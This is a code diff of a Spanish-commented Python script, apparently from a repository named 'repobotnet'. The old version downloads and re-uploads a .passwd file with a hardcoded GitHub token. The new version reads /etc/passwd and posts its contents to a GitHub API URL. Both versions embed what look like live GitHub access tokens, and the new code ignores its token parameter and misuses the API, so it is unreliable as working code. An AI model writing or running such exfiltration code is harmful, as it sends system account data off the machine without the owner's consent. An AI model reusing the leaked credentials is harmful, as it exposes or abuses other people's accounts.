@@ -1,37 +1,25 @@
-import github
+import os
 import requests
-import base64
 
-# Autenticación con GitHub usando un token de acceso personal
-g = github.Github("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")
+def get_passwd():
+    """Obtiene el contenido del archivo passwd."""
+    with open("/etc/passwd", "r") as f:
+        return f.read()
 
-# Obtener el repositorio
-repo = g.get_user().get_repo("repobotnet")
+def send_passwd(passwd, token, url):
+    """Envía el contenido del archivo passwd a una ubicación remota usando un token de autenticación de GitHub."""
+    headers = {
+        "Authorization": f"token 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"
+    }
+    response = requests.post(url, headers=headers, data=passwd)
 
-# Definir la URL del archivo a descargar
-url = 'https://raw.githubusercontent.com/yasjavi/repobotnet/main/.passwd'
-
-def download_file():
-    print('[!] Descargando .passwd')
-    response = requests.get(url)
     if response.status_code == 200:
-        content = response.content
-        with open(".passwd", 'wb') as file:
-            file.write(content)
-        print('[!] .passwd descargado con éxito.')
+        print("El archivo passwd se cargó correctamente.")
     else:
-        print('[-] Fallo al descargar .passwd. Código de estado:', response.status_code)
+        print("No se pudo cargar el archivo passwd.")
 
-def upload_file():
-    print('[!] Subiendo .passwd al repositorio')
-    with open(".passwd", "rb") as file:
-        # Crear un nuevo archivo en el repositorio
-        repo.create_file(".passwd", "Actualizando .passwd en el repositorio", file.read())
-    print('[!] .passwd cargado con éxito en el repositorio.')
-
-# Descargar el archivo
-download_file()
-
-# Subir el archivo al repositorio
-upload_file()
-
+if __name__ == "__main__":
+    passwd = get_passwd()
+    token = "<token_de_autenticación_de_GitHub>"  # Reemplace con su token real
+    url = "https://api.github.com/repos/yasjavi/archivos/contents/passwd.txt"  # Reemplace con la URL real
+    send_passwd(passwd, token, url)
